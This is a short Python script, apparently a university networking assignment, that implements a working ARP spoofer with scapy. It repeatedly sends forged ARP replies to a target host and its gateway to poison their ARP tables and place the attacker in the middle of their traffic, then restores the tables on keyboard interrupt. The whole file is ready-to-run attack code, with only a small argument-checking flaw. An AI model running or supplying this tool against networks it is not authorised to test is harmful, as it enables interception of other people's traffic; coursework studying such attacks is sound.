"""
ICT 2203
Assignment 1
ARP Spoofer
"""

import sys
import scapy.all as scapy
import time
import pyfiglet


# Reset ARP tables back to original values
def resetArpTable(destIP, srcIP):
    print("\n[*] resetting ARP tables...")
    destMac = getMac(destIP)
    srcMac = getMac(srcIP)
    packet = scapy.ARP(op=2, pdst=destIP, hwdst=destMac, psrc=srcIP, hwsrc=srcMac)
    scapy.send(packet, verbose=False)


# To get MAC address of target and router
def getMac(ip):
    arpReq = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arpReq = broadcast / arpReq
    reply = scapy.srp(broadcast_arpReq, timeout=5, verbose=False)[0]
    return reply[0][1].hwsrc


# Poison Target's and Gateway's ARP tables
def spoofARP(targetIP, spoofIP):
    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=getMac(targetIP), psrc=spoofIP)
    scapy.send(packet, verbose=False)


# Display instructions
def msg():
    title = pyfiglet.figlet_format("ARP Spoofer")
    print(title)
    print("\nUsage: ")
    print("\n$ python3 arpspf.py <target IP> <gateway IP>")
    print("\nFollow the above format to prevent the error shown below: \n")


# MITM attack function
def attack():
    try:
        packets_count = 0
        while True:  # update ARP tables constantly
            spoofARP(targetIP, gatewayIP)
            spoofARP(gatewayIP, targetIP)
            packets_count += 2
            print("\r[*]" + str(packets_count) + " packets sent ", end="")
            time.sleep(2)  # 2s wait before updating ARP table again
    except KeyboardInterrupt:  # exit program with keyboard interrupt
        print("\n[!] Exiting ARP Spoofer...")
        resetArpTable(gatewayIP, targetIP)
        resetArpTable(targetIP, gatewayIP)
        print("\n[+] ARP tables have been reset.")
        print("\n[+] Arp Spoof Stopped\n")
        print("\n[+] Arp Spoof Stopped")
        bye = pyfiglet.figlet_format("P2 Group 13", font="digital")
        print(bye)


if __name__ == '__main__':
    if len(sys.argv) != 3:
        msg()
    targetIP = sys.argv[1]
    gatewayIP = sys.argv[2]
    attack()
